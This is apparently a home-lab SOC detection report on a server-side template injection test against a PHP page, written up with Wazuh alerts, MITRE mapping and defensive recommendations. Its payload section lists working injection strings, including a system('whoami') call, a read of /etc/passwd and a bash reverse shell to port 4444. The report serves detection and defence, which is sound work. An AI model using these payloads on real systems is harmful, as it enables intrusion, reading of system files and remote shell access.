# SSTI DETECTION REPORT

## Executive Summary
- Detection Type: Server-Side Template Injection (SSTI)
- Agent: kali (192.168.1.109)
- Web Server: Apache2
- Target: /var/www/html/ssti.php
- Total Alerts: 5
- Time Period: 2026-10-10 14:58:11 PKT
- Attack Source: 127.0.0.1 (localhost)

## Alert Details

| Rule ID | Description | Level | MITRE |
|---------|-------------|-------|-------|
| 31122 | Web server 500 error code (Internal Error) | 5 | T1190 |

## Attack Payloads Detected

1. **Basic SSTI:**
   GET /ssti.php?name={{7*7}}

2. **PHP Code Injection:**
   GET /ssti.php?name=;system('whoami');

3. **Command Execution:**
   GET /ssti.php?name=;cat /etc/passwd;

4. **Reverse Shell:**
   GET /ssti.php?name=;bash -i >& /dev/tcp/127.0.0.1/4444 0>&1;

## MITRE ATT&CK Mapping
- **T1190** - Exploit Public-Facing Application
- **T1059** - Command and Scripting Interpreter
- **Tactic:** Initial Access, Execution

## Key Findings
1. Wazuh detected SSTI payloads via 500 errors
2. Template injection allows code execution
3. Real SOC: block IP, sanitize input
4. Lab: authorized test

## Recommended Actions
1. **Immediate:** No escalation (lab)
2. **Real SOC:** Block source IP
3. **Real SOC:** Sanitize user input
4. **Real SOC:** Avoid eval() and dynamic templates
5. **Improvement:** Add SSTI rules
6. **Improvement:** Integrate Suricata

## Status
**CLOSED** - Lab simulation

## Analyst Notes
SSTI is a critical web vulnerability.
It allows:
- Arbitrary code execution
- File system access
- Reverse shells
- Full server compromise

Detection relies on:
- Template pattern detection ({{ }}, ${ })
- Response code monitoring (500 errors)
- Wazuh built-in rules (31100-31199)
